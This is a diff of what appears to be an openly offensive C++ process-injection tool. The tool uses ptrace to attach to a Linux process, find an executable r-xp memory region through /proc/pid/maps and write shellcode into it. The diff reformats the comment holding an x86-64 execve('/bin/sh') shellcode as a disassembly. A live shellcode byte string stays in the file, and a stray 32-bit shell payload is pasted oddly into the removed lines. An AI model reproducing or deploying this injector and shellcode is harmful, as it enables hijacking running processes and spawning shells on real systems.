@@ -23,22 +23,21 @@ main:
     ;mov rbx, 0xdeadbeefcafe1dea
     ;mov rcx, 0xdeadbeefcafe1dea
     ;mov rdx, 0xdeadbeefcafe1dea
-    xor eax, eax
-    mov rbx, 0xFF978CD091969DD1
-    neg rbx
-    push rbx
-    ;mov rdi, rsp
-    push rsp
-    pop rdi
-    cdq
-    push rdx
-    push rdi"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
-		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-    ;mov rsi, rsp
-    push rsp
-    pop rsi
-    mov al, 0x3b
-    syscall
+    00000000  31C0              xor eax,eax
+    00000002  48BBD19D9691D08C  mov rbx,0xff978cd091969dd1
+             -97FF
+    0000000C  48F7DB            neg rbx
+    0000000F  53                push rbx
+    00000010  54                push rsp
+    00000011  5F                pop rdi
+    00000012  99                cdq
+    00000013  52                push rdx
+    00000014  57                push rdi
+    00000015  54                push rsp
+    00000016  5E                pop rsi
+    00000017  B03B              mov al,0x3b
+    00000019  0F05              syscall
+
 */
 const char* __shellcode__ = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                             "\x91\xd0\x8c\x97\xff\x48\xf7"
@@ -236,11 +235,14 @@ long SCI::Parser::parse_process_id_maps(long target_process_identifier) {
   }
 
   std::size_t maps_line_length = 0;
+
   while (getline(&maps_line, &maps_line_length, maps_file) != -1) {
     ext.permissions = proc.return_file_permissions(maps_line);
     if (ext.permissions == NULL) {
+      //ptruths->non_rxp = true;
       continue;
     } else if (strncmp("r-xp", ext.permissions, 4) == 0) {
+        // Output & free mapped permissions
         std::cout << "-> Code Execution Allowed \n\t-> Mapped Permissions/Flags: " << ext.permissions << '\n';
         free(ext.permissions);
         break;
@@ -283,6 +285,8 @@ bool SCI::Injector::proc_inject(long target_process_identifier) {
       std::cout << "-> Attached To Target Proc: " << target_pid << '\n';
   }
 
+  SCI::ptruths ptruths;
+
   if (ptrace(PTRACE_GETREGS, target_pid, NULL, &old_regs) < K55_STANDARD_SUCCESS_CODE) {
     SET_DEBUG_VALUE(default_status, __n_get_registers_fatal__);
     std::cerr << "Cannot trace process registers\n";
@@ -301,6 +305,8 @@ bool SCI::Injector::proc_inject(long target_process_identifier) {
       std::cerr << "Cannot Execute Payload In Address: 0x" << std::hex << ext.address << '\n';
       return false;
     }
+    ptruths.r_xp = true;
+
   }
   // Does not throw exceptions...
   std::memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
